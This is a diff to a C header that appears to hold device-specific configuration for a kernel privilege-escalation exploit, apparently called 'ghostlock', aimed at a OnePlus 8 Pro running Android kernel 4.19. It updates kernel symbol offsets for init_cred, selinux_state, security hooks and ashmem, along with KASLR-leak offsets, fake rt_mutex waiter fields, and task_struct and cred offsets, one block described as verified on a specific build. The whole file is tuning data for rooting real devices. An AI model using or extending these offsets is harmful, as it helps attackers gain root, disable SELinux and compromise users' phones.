@@ -4,10 +4,8 @@
 #define BUILD_VARIANT_LABEL "ghostlock_k419"
 #define BUILD_FINGERPRINT "oneplus/ghostlock_msm419"
 
-/* Data work in progress. */
-
 /* Kernel address space — 4.19 arm64 Android (VA_BITS=39) */
-#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
+#define KIMAGE_TEXT_BASE 0xffffff8008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0  /* unknown, resolved at runtime via kallsyms */
@@ -20,46 +18,46 @@
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
 /* Global symbol offsets (kallsyms extracted from kernel.elf) */
-#define INIT_TASK_OFF          0x0279C9C0ULL
-#define INIT_CRED_OFF          0x027ACAA8ULL  /* resolved via kallsyms_lookup_name */
-#define INIT_UTS_NS_OFF        0x0279C768ULL
-#define EMPTY_ZERO_PAGE_OFF    0x02B03000ULL
-#define ROOT_TASK_GROUP_OFF    0x02B09E40ULL
-#define SELINUX_ENFORCING_OFF  0x0345C000ULL  /* selinux_state */
+#define INIT_TASK_OFF          0x0281C9C0ULL
+#define INIT_CRED_OFF          0x0282CAA8ULL  /* resolved via kallsyms_lookup_name */
+#define INIT_UTS_NS_OFF        0x0281C768ULL
+#define EMPTY_ZERO_PAGE_OFF    0x02B83000ULL
+#define ROOT_TASK_GROUP_OFF    0x02B89E40ULL
+#define SELINUX_ENFORCING_OFF  0x034DC000ULL  /* selinux_state */
 #define KPTR_RESTRICT_OFF      0ULL  /* resolved via kallsyms_lookup_name */
 #define CAP_CAPABLE_ACTIVE_OFF 0ULL  /* resolved via kallsyms_lookup_name */
 #define KPTR_RESTRICT          0ULL
 
 #define SELINUX_BLOB_SIZES_OFF  0ULL
-#define SECURITY_HOOK_HEADS_OFF 0x022EFF20ULL
-#define KMALLOC_CACHES_OFF      0x022EFA20ULL
-#define ANON_PIPE_BUF_OPS_OFF   0x01AED800ULL
+#define SECURITY_HOOK_HEADS_OFF 0x0236FF20ULL
+#define KMALLOC_CACHES_OFF      0x0236FA20ULL
+#define ANON_PIPE_BUF_OPS_OFF   0x01B6D800ULL
 
 /* UMH root: OnePlus seems to have the Usermode Helper the original 4.19 kernel lacks of. */
-#define SYSTEM_UNBOUND_WQ_OFF             0x0280DB88ULL
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00E01B8ULL
+#define SYSTEM_UNBOUND_WQ_OFF           0x280DB88ULL
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000E01B8ULL
 
 /* Ashmem (Android shared memory) */
-#define ASHMEM_MISC_FOPS_OFF       0x029C83A0ULL
-#define ASHMEM_FOPS_OFF            0ULL
-#define ASHMEM_IOCTL_OFF           0ULL
+#define ASHMEM_MISC_FOPS_OFF       0x29C83A0ULL
+#define ASHMEM_FOPS_OFF            0x01CCEF68ULL
+#define ASHMEM_IOCTL_OFF           0x00F46580ULL
 #define ASHMEM_COMPAT_IOCTL_OFF    0ULL
-#define ASHMEM_MMAP_OFF            0ULL
-#define ASHMEM_OPEN_OFF            0ULL
-#define ASHMEM_RELEASE_OFF         0ULL
-#define ASHMEM_SHOW_FDINFO_OFF     0ULL
+#define ASHMEM_MMAP_OFF            0x00F46F00ULL
+#define ASHMEM_OPEN_OFF            0x00F47068ULL
+#define ASHMEM_RELEASE_OFF         0x00F470E0ULL
+#define ASHMEM_SHOW_FDINFO_OFF     0x00F471F8ULL
 
 /* Configfs — not available in 4.19 Android kernel */
 #define CONFIGFS_READ_ITER_OFF      0ULL
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0ULL
-#define COPY_SPLICE_READ_OFF        0ULL
-#define NOOP_LLSEEK_OFF             0x0025F268ULL
+#define COPY_SPLICE_READ_OFF        0x00321650ULL
+#define NOOP_LLSEEK_OFF             0x002DF268ULL
 
 /* KASLR leak */
-#define SLIDE_NFULNL_LOGGER_OFF       0x02792690ULL
-#define SLIDE_LOGGERS_0_1_OFF         0x027925C8ULL  /* resolved via kallsyms */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02D4E80CULL  /* resolved via kallsyms */
-#define SLIDE_SYSCTL_BOOTID_OFF       0x02D4E80CULL  /* resolved via kallsyms */
+#define SLIDE_NFULNL_LOGGER_OFF       0x02812690ULL
+#define SLIDE_LOGGERS_0_1_OFF         0x028125C8ULL  /* resolved via kallsyms */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02DCE80CULL  /* resolved via kallsyms */
+#define SLIDE_SYSCTL_BOOTID_OFF       0x02DCE80CULL  /* resolved via kallsyms */
 
 /* Derived macros */
 #define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
@@ -120,27 +118,29 @@
 #define FAKE_WAITER_WAKE_STATE_OFF        0x50
 #define FAKE_WAITER_WW_CTX_OFF            0x48
 
-/* task_struct offsets for 4.19 arm64 */
-#define FAKE_TASK_USAGE_OFF          0x40
-#define FAKE_TASK_PRIO_OFF           0xAC
-#define FAKE_TASK_NORMAL_PRIO_OFF    0xB4
+/* verified offsets — OnePlus 8 Pro, RKQ1.211119.001, 4.19.157-perf+ Oct 11 2025 */
+#define FAKE_TASK_USAGE_OFF          0x68
+#define FAKE_TASK_PRIO_OFF           0xBC
+#define FAKE_TASK_NORMAL_PRIO_OFF    0xC4
 #define FAKE_TASK_TASK_GROUP_OFF     0x418
-#define FAKE_TASK_PI_LOCK_OFF        0x8B8
-#define FAKE_TASK_PI_WAITERS_OFF     0x8CC
-#define FAKE_TASK_PI_TOP_TASK_OFF    0x8DC
-#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x8E4
+#define FAKE_TASK_PI_LOCK_OFF        0x8C4
+#define FAKE_TASK_PI_WAITERS_OFF     0x8D0
+#define FAKE_TASK_PI_TOP_TASK_OFF    0x8E0
+#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x8E8
 
-#define MM_OWNER_OFF             0x350
-#define TASK_PID_OFF             0x5D4
-#define TASK_TGID_OFF            0x5D8
-#define TASK_REAL_PARENT_OFF     0x5E0
-#define TASK_ATOMIC_FLAGS_OFF    0x598
-#define TASK_REAL_CRED_OFF       0x780
-#define TASK_CRED_OFF            0x788
-#define TASK_COMM_OFF            0x798
-#define TASK_TASKS_OFF           0x4D0
+#define MM_OWNER_OFF               0x330   /* mm_struct */
+#define TASK_PID_OFF               0x5D4   /* pending — verify with gettid */
+#define TASK_TGID_OFF              0x5D8
+#define TASK_REAL_PARENT_OFF       0x640
+#define TASK_REAL_CRED_OFF         0x7D8
+#define TASK_CRED_OFF              0x7E0
+#define TASK_COMM_OFF              0x7E8
+#define TASK_TASKS_OFF             0x530
 #define TASK_THREAD_INFO_FLAGS_OFF 0x00
-#define TASK_SECCOMP_OFF         0x850
+#define TASK_SECCOMP_OFF           0x8A0   /* filter at +0x8A8 */
+#define TASK_MM_OFF                0x580
+#define TASK_ALLOC_LOCK_OFF        0x8C0
+#define TASK_FLAGS_OFF             0x6C
 
 /* cred struct offsets (same across versions) */
 #define CRED_UID_OFF         8
